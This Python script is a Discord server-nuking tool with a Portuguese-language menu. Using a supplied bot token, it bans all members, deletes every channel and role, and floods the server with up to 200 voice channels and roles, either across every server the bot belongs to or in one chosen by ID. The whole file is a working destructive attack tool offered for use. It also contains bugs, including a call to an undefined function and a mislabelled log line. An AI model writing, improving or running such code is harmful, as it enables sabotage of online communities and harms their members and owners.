import discord
from discord.ext import commands
from colorama import init, Fore as cc
from os import name as os_name, system
from sys import exit
init()
dr = DR = r = R = cc.LIGHTRED_EX
g = G = cc.LIGHTGREEN_EX
b = B = cc.LIGHTBLUE_EX
m = M = cc.LIGHTMAGENTA_EX
c = C = cc.LIGHTCYAN_EX
y = Y = cc.LIGHTYELLOW_EX
w = W = cc.RESET

clear = lambda: system('cls') if os_name == 'nt' else system('clear')
def _input(text):print(text, end='');return input()

baner = f'''
{r}          _____                    _____            _____            _____                    _____                    _____          
{r}         /\    \                  /\    \          /\    \          /\    \                  /\    \                  /\    \         
{r}        /::\    \                /::\____\        /::\____\        /::\    \                /::\    \                /::\    \        
{r}       /::::\    \              /:::/    /       /:::/    /       /::::\    \              /::::\    \              /::::\    \       
{r}      /::::::\    \            /:::/    /       /:::/    /       /::::::\    \            /::::::\    \            /::::::\    \      
{r}     /:::/\:::\    \          /:::/    /       /:::/    /       /:::/\:::\    \          /:::/\:::\    \          /:::/\:::\    \     
{r}    /:::/__\:::\    \        /:::/    /       /:::/    /       /:::/__\:::\    \        /:::/__\:::\    \        /:::/  \:::\    \    
{r}   /::::\   \:::\    \      /:::/    /       /:::/    /       /::::\   \:::\    \      /::::\   \:::\    \      /:::/    \:::\    \   
{r}  /::::::\   \:::\    \    /:::/    /       /:::/    /       /::::::\   \:::\    \    /::::::\   \:::\    \    /:::/    / \:::\    \  
{r} /:::/\:::\   \:::\    \  /:::/    /       /:::/    /       /:::/\:::\   \:::\ ___\  /:::/\:::\   \:::\    \  /:::/    /   \:::\ ___\ 
{r}/:::/  \:::\   \:::\____\/:::/____/       /:::/____/       /:::/__\:::\   \:::|    |/:::/  \:::\   \:::\____\/:::/____/     \:::|    |
{r}\::/    \:::\  /:::/    /\:::\    \       \:::\    \       \:::\   \:::\  /:::|____|\::/    \:::\  /:::/    /\:::\    \     /:::|____|
{r} \/____/ \:::\/:::/    /  \:::\    \       \:::\    \       \:::\   \:::\/:::/    /  \/____/ \:::\/:::/    /  \:::\    \   /:::/    / 
{r}          \::::::/    /    \:::\    \       \:::\    \       \:::\   \::::::/    /            \::::::/    /    \:::\    \ /:::/    /  
{r}           \::::/    /      \:::\    \       \:::\    \       \:::\   \::::/    /              \::::/    /      \:::\    /:::/    /   
{r}           /:::/    /        \:::\    \       \:::\    \       \:::\  /:::/    /               /:::/    /        \:::\  /:::/    /    
{r}          /:::/    /          \:::\    \       \:::\    \       \:::\/:::/    /               /:::/    /          \:::\/:::/    /     
{r}         /:::/    /            \:::\    \       \:::\    \       \::::::/    /               /:::/    /            \::::::/    /      
{r}        /:::/    /              \:::\____\       \:::\____\       \::::/    /               /:::/    /              \::::/    /       
{r}        \::/    /                \::/    /        \::/    /        \/  ____/                \::/    /                \::/____/        
{r}         \/____/                  \/____/          \/____/          ~~                       \/____/                  ~~              
                                                                                                                                      
'''


async def delete_all_channel(guild):
    deleted = 0
    for channel in guild.channels:
        try:
            await channel.delete()
            deleted += 1
        except:
            continue
    return deleted

async def delete_all_roles(guild):
    deleted = 0
    for role in guild.roles:
        try:
            await role.delete()
            deleted += 1
        except:
            continue
    return deleted

async def ban_all_members(guild):
    banned = 0
    for member in guild.members:
        try:
            await member.ban()
            banned += 1
        except:
            continue
    return banned


async def create_roles(guild, name):
    created = 0
    for _ in range(200 - len(guild.roles)):
        try:
            await guild.create_role(name=name)
            created += 1
        except:
            continue
    return created

async def create_voice_channels(guild, name):
    created = 0
    for _ in range(200 - len(guild.channels)):
        try:
            await guild.create_voice_channel(name=name)
            created += 1
        except:
            continue
    return created

async def nuke_guild(guild):
    print(f'{r}Nuke: {m}{guild.name}')
    banned = await ban_all_members(guild)
    print(f'{m}Banidos:{b}{banned}')
    deleted_channels = await delete_all_channel(guild)
    print(f'{m}Canais Apagados:{b}{deleted_channels}')
    delete_roles = await delete_all_roles(guild)
    print(f'{m}Canais Apagados:{b}{delete_roles}')
    created_channels = await create_voice_channels(guild,name)
    print(f'{m}Canais de Voz Criados:{b}{created_channels}')
    created_roles = await created_roles(guild,name)
    print(f'{m}Canais Criados:{b}{created_roles}')
    print(f'{r}--------------------------------------------\n\n')


while True:
    clear()
    choice = input(f'''   
{baner}                
{c}--------------------------------------------
{b}[Menu de Startup]
    {y}└─[1] {m}- {r}Rodar Programa
    {y}└─[2] {m}- {r}Sair
{y}====>{g}''')
    if choice == '1':
        token = _input(f'{y}Insira o Token do Bot:{g}')
        name = _input(f'{y}Coloque o nomes do canais que serão criados / Cargos:{g}')
        clear()
        choice_type = _input(f'''
{baner}                
{c}--------------------------------------------
{b}[Selecione]
    {y}└─[1] {m}- {g}Apagar todos os Servidores.
    {y}└─[2] {m}- {g}Apagar apenas 1 Servidor (ID).  
    {y}└─[3] {m}- {g}Sair
{y}====>{g}''')
        client = commands.Bot(command_prefix='.',intents=discord.Intents.all())
        if choice_type == '1':
            @client.event
            async def on_ready():
                print(f'''
[+]Estamos usando: {client.user.name}
[+]Bot está em: {len(client.guilds)} Servidores''')
                for guild in client.guilds:
                    await nuke_guild(guild)
                await client.close()
        elif choice_type == '2':
            guild_id =  _input(f'{y}Coloque o ID do Servidor:{g}')
            @client.event
            async def on_ready():
                for guild in client.guilds:
                    if str(guild.id) == guild_id:
                        await nuke_guild(guild)
                await client.close()
        elif choice_type == '3':
            print(f'{dr}Saindo...')
            exit()
        try:
            client.run(token)
            input('Operação finalizada, pressione qualquer Tecla para Sair....')
        except Exception as error:
            if error == '''O Shard ID None está solicitando intenções privilegiadas que não foram explicitamente habilitadas no portal do desenvolvedor. É recomendável acessar https://discord.com/developers/applications/ e habilitar explicitamente as intenções privilegiadas na página do seu aplicativo. Se isso não for possível, considere desabilitar as intenções privilegiadas.''':
                input(f'{r}Obtivemos um erro com as intents\n{g}Para arrumar acesse -> https://media.discordapp.net/attachments/1093180252567642164/1099826016848986152/image.png?width=837&height=468\n{b}Pressione Enter para sair...')
            else:
                input(f'{r}{error}\n{b}Press enter for return...')
            continue
    elif choice == '2':
        print(f'{dr}Exit...')
        exit()